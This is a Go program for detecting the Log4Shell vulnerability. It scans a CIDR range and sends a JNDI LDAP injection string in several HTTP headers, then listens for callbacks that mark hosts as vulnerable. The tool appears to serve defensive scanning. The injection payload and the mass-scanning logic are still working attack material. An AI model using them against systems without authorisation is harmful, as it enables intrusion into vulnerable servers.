package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

// Handles incoming requests.
func handleRequest(conn net.Conn) {
	// Make a buffer to hold incoming data.
	buf := make([]byte, 1024)
	// Get address of connection
	if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
		log.Printf("Possibly vulnerable host identified: %v", addr.IP.String())
	}
	// Read the incoming connection into the buffer.
	_, err := conn.Read(buf)
	if err != nil {
		log.Printf("Error reading: %v", err.Error())
	}
	// Close the connection when you're done with it.
	conn.Close()
}

func urlsCIDR(destCIDR string, destPort string) ([]string, error) {
	ip, ipv4Net, err := net.ParseCIDR(destCIDR)
	if err != nil {
		return nil, err
	}

	var ips []string
	for ip := ip.Mask(ipv4Net.Mask); ipv4Net.Contains(ip); increment(ip) {
		ips = append(ips, fmt.Sprintf("http://%v:%v", ip, destPort))
	}
	return ips, nil
}

func increment(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func request(url string, payload string) error {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return fmt.Errorf("Got error %s", err.Error())
	}
	// Poison a whole bunch
	req.Header.Set("User-Agent", payload)
	req.Header.Add("X-Api-Version", payload)
	req.Header.Add("Bearer", payload)
	req.Header.Add("Authentication", payload)
	//log.Printf("Testing %v", req)
	client := &http.Client{
		Timeout: time.Millisecond * 50,
	}
	response, err := client.Do(req)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	return nil
}

func main() {
	// Define vars
	var welcome string = "Log4Shell Vulnerability Detection.\n---------"
	var sourceIp string
	var sourcePort string
	var destCIDR string
	var destPort string
	var connType string = "tcp"

	// Register flags
	flag.StringVar(&sourceIp, "SourceIP", "Unset", "Your Preferred Source/Requesting IP for Callback")
	flag.StringVar(&sourcePort, "SourcePort", "8081", "Port used for listening on callback, defaults to 8081")
	flag.StringVar(&destCIDR, "DestCIDR", "192.168.10.0/24", "What Subnet do you want to scan?")
	flag.StringVar(&destPort, "DestPort", "8080", "At what port are the applications you want to scan?")

	// Parse flags
	flag.Parse()

	// Log out passed configuration
	log.Printf(welcome)
	if sourceIp == "Unset" {
		log.Printf("You did not set -SourceIP, please try again or run with --help")
		os.Exit(1)
	}
	if !strings.Contains(destCIDR, "/") {
		log.Printf("Ensure your properly structured your cidr, e.g., 192.168.1.0/24")
		os.Exit(1)
	}
	payload := "${jndi:ldap://" + sourceIp + ":" + sourcePort + "/blu}"
	log.Printf("Running configuration based on input:")
	log.Printf("Source/Callback IP: %v", sourceIp)
	log.Printf("Source/Callback Port: %v", sourcePort)
	log.Printf("Payload: %v", payload)
	log.Printf("Target CIDR: %v", destCIDR)
	log.Printf("Target Port: %v", destPort)

	// Listen on requested port
	l, err := net.Listen(connType, sourceIp+":"+sourcePort)
	if err != nil {
		log.Printf("Error listening: %v", err.Error())
		os.Exit(1)
	}
	defer l.Close()
	log.Printf("Listening on " + sourceIp + ":" + sourcePort + "\n---------")

	urls, err := urlsCIDR(destCIDR, destPort)
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("Scanning %v CIDR now!\n---------", destCIDR)
	for _, url := range urls {
		request(url, payload)
	}

	log.Printf("Completed scanning of provided CIDR, leaving connection open for later callbacks. You should ctrl+c this program once final callbacks have landed.\n---------")
	for {
		// Listen for an incoming connection.
		conn, err := l.Accept()
		if err != nil {
			log.Printf("Error accepting: %v", err.Error())
			os.Exit(1)
		}
		// Handle connections in a new goroutine.
		go handleRequest(conn)
	}
}
